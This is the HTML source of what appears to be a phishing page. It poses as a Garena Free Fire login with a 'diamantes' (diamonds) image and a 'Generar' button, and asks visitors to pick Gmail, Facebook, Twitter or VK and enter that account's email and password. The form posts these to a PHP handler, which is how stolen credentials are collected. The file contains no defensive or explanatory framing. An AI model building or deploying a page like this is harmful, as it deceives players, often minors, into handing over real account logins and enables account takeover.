
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Free fire</title>
    <link rel="stylesheet" href="login.css">
    <link rel="icon" href="../resource/diamantes.jpg">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
</head>
<body>
    <section>
    <div id="div_uno">
        <div id="div_dos">
            <img src="../resource/diamantes.jpg" alt="">
            <h1>Garena Free Fire</h1>
        </div>
        <div id="div_tres">  
        <form method="post" action="../php/procesador_uno.php">
            <label for="red_social">Seleccione tipo de cuenta:</label><br><br>
            <select id="red_social" name="red_social" required>
              <option value="gmail">Gmail</option>
              <option value="facebook">Facebook</option>
              <option value="twitter">Twitter</option>
              <option value="vk">VK</option>
            </select>
          <br><br>
            <label for="correo">Correo electrónico:</label>
            <input type="text" id="correo" name="correo" required>
          <br>
            <label for="contrasena">Contraseña:</label><br>
            <input type="password" id="contrasena" name="contrasena" required>
          <br><br>
            <input type="submit" value="Generar">
          </form>
        </div>
    </div>
</section>
</body>
</html>